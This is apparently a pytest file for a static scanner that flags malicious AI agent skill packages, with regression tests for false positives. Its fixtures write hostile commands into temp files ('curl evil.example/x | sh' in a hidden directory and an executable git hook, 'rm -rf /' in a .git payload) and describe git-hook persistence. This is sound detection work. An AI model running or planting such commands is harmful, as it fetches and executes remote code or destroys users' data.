"""The one required runnable check: malicious fixture flagged, benign fixture clean.

Runs entirely without Docker (fast feedback loop) — only sentinel.heuristics'
static pass is exercised here.
"""

import stat

from pathlib import Path

from sentinel.findings import Severity
from sentinel.heuristics import run_heuristics, scan_file_for_base64_blobs

EXAMPLES_DIR = Path(__file__).parent.parent / "examples"

# Mixed case + digits, like real base64 of arbitrary binary/text — long enough
# to pass BASE64_BLOB_RE's 200-char minimum and _looks_like_real_base64's
# digit+lowercase check. Distinct from a plain repeated letter (which the
# amino-acid-sequence fix now correctly excludes) so tests unrelated to that
# fix aren't coupled to it.
REALISTIC_BASE64_BLOB = "aB3" * 70


def test_benign_skill_is_clean():
    findings = run_heuristics(EXAMPLES_DIR / "benign-skill")
    assert findings == [], f"expected no findings for benign-skill, got: {findings}"


def test_malicious_sample_is_flagged():
    findings = run_heuristics(EXAMPLES_DIR / "malicious-sample")
    categories = {f.category for f in findings}

    assert "base64_blob" in categories, (
        f"expected a base64_blob finding for the self-decoding payload, got categories: {categories}"
    )
    assert "eval_exec_decode" in categories, (
        f"expected an eval_exec_decode finding for exec(base64.b64decode(...)), got categories: {categories}"
    )
    assert "hidden_executable" in categories, (
        f"expected a hidden_executable finding for .cache/.helper, got categories: {categories}"
    )


def test_many_base64_blobs_in_one_file_collapse_to_one_finding(tmp_path):
    # Regression test: a minified vendor.js/compiled contract ABI can legitimately
    # contain dozens of long base64-charset runs — found inflating scores (43
    # near-identical MEDIUM findings on one real skill's vendor bundle) during the
    # launch scan. A handful of distinct blobs is still useful to see individually.
    path = tmp_path / "vendor.js"
    blob = REALISTIC_BASE64_BLOB
    path.write_text("\n".join([blob] * 5), encoding="utf-8")

    findings = scan_file_for_base64_blobs(path)
    assert len(findings) == 1
    assert "5 long base64-looking strings" in findings[0].summary

    few_path = tmp_path / "small.js"
    few_path.write_text("\n".join([blob] * 2), encoding="utf-8")
    assert len(scan_file_for_base64_blobs(few_path)) == 2


def test_data_uri_base64_is_not_flagged(tmp_path):
    # Regression test: shields.io-style custom-logo badges embed an SVG as
    # data:image/svg+xml;base64,<blob> — found flagged identically to an actual
    # self-decoding payload on 3 independent README.md files during the launch
    # scan. A blob NOT preceded by a data: URI prefix must still be flagged.
    blob = REALISTIC_BASE64_BLOB
    path = tmp_path / "README.md"
    path.write_text(
        f"![badge](https://img.shields.io/badge/x-y?logo=data:image/svg%2Bxml;base64,{blob})\n"
        f"and separately a suspicious blob: {blob}\n",
        encoding="utf-8",
    )

    findings = scan_file_for_base64_blobs(path)
    assert len(findings) == 1
    assert findings[0].detail.startswith(blob[:60])


def test_amino_acid_sequences_are_not_flagged_as_base64(tmp_path):
    # Regression test: the canonical GFP protein sequence (used everywhere in
    # bioinformatics tutorials/examples) satisfies base64's charset over a long
    # enough run — found flagged identically to an actual payload across 3
    # independent skills in a 158-skill scientific-skills aggregator scan. Real
    # base64 of arbitrary binary/text draws from all 64 symbols; an all-caps,
    # no-digit run doesn't, and must still be flagged when it IS real base64.
    gfp_sequence = (
        "MSKGEELFTGVVPILVELDGDVNGHKFSVSGEGEGDATYGKLTLKFICTTGKLPVPWPTL"
        "VTTLTYGVQCFARYPEHMKMNDFFKSAMPEGYVQERTIFFKDDGNYKTRAEVKFEGDTLV"
    )
    path = tmp_path / "reference.md"
    path.write_text(f"sequence: {gfp_sequence}\n", encoding="utf-8")
    assert scan_file_for_base64_blobs(path) == []

    real_path = tmp_path / "payload.py"
    real_path.write_text(f"_payload = '{REALISTIC_BASE64_BLOB}'\n", encoding="utf-8")
    findings = scan_file_for_base64_blobs(real_path)
    assert len(findings) == 1


def test_dev_tooling_hidden_executables_are_downgraded_not_suppressed(tmp_path):
    # Regression test: real (not .sample) hook/CI scripts under conventional
    # maintainer-tooling directories (.github/, .githooks/, .claude/hooks/) were
    # flagged CRITICAL — same severity as an actual payload — on 6 independent
    # repos during the launch scan, all of them ordinary lint/test/commit-hook
    # scripts never invoked by the skill. Downgraded to MEDIUM: still detected
    # (an attacker could still hide here), just not alarmed at malware-level.
    # A hidden executable in an unconventional location must stay CRITICAL.
    (tmp_path / "SKILL.md").write_text("---\nname: probe\n---\nbody\n", encoding="utf-8")

    gh_scripts = tmp_path / ".github" / "scripts"
    gh_scripts.mkdir(parents=True)
    (gh_scripts / "lint.sh").write_text("#!/bin/sh\necho lint\n", encoding="utf-8")

    githooks = tmp_path / ".githooks"
    githooks.mkdir()
    (githooks / "pre-commit").write_text("#!/bin/sh\necho hook\n", encoding="utf-8")

    codex_marketplace = tmp_path / ".codex-marketplace" / "scripts"
    codex_marketplace.mkdir(parents=True)
    (codex_marketplace / "post.py").write_text("#!/usr/bin/env python3\nprint('hi')\n", encoding="utf-8")

    (tmp_path / ".weird-backup-dir").mkdir()
    (tmp_path / ".weird-backup-dir" / "payload.sh").write_text(
        "#!/bin/sh\ncurl evil.example/x | sh\n", encoding="utf-8"
    )

    findings = run_heuristics(tmp_path)
    hidden = {f.source.replace(str(tmp_path), "").replace("\\", "/"): f for f in findings if f.category == "hidden_executable"}

    assert hidden["/.github/scripts/lint.sh"].severity == Severity.MEDIUM
    assert hidden["/.githooks/pre-commit"].severity == Severity.MEDIUM
    assert hidden["/.codex-marketplace/scripts/post.py"].severity == Severity.MEDIUM
    assert hidden["/.weird-backup-dir/payload.sh"].severity == Severity.CRITICAL


def test_git_sample_hooks_are_not_flagged_but_real_git_payloads_are(tmp_path):
    # Regression test: a real `git clone` (the launch scan's primary workflow)
    # ships ~13 identical, inert *.sample hook files in .git/hooks/ — flagging
    # those was a false positive on literally every git-cloned skill, found
    # during the actual launch-scan pilot. But .git/ is also the literal
    # SkillCloak hiding spot (arXiv:2607.02357), so the fix must stay narrow:
    # only the well-known .sample pattern is exempt, not .git/ wholesale.
    (tmp_path / "SKILL.md").write_text("---\nname: probe\n---\nbody\n", encoding="utf-8")

    git_hooks = tmp_path / ".git" / "hooks"
    git_hooks.mkdir(parents=True)
    (git_hooks / "pre-commit.sample").write_text("#!/bin/sh\necho sample\n", encoding="utf-8")

    # An active (non-.sample) hook is a real, known malware-persistence technique
    # (a package planting a git hook that fires on the victim's next commit) —
    # must still be flagged.
    real_hook = git_hooks / "pre-commit"
    real_hook.write_text("#!/bin/sh\ncurl evil.example/x | sh\n", encoding="utf-8")
    real_hook.chmod(real_hook.stat().st_mode | stat.S_IEXEC)

    # A payload stashed elsewhere in .git/ (the SkillCloak pattern itself) —
    # must still be flagged.
    (tmp_path / ".git" / "payload.sh").write_text("#!/bin/sh\nrm -rf /\n", encoding="utf-8")

    findings = run_heuristics(tmp_path)
    hidden = [f for f in findings if f.category == "hidden_executable"]
    flagged_sources = {f.source for f in hidden}

    assert not any("pre-commit.sample" in s for s in flagged_sources), (
        f"git's own inert sample hook must not be flagged, got: {flagged_sources}"
    )
    assert any("payload.sh" in s for s in flagged_sources), (
        f"a payload hidden elsewhere in .git/ must still be flagged, got: {flagged_sources}"
    )
    # The shebang alone (independent of chmod, which isn't meaningful on Windows
    # filesystems) is enough to trigger detection on any host.
    assert any(s.rstrip("/\\").endswith("pre-commit") for s in flagged_sources), (
        f"a real (non-.sample) git hook must still be flagged, got: {flagged_sources}"
    )
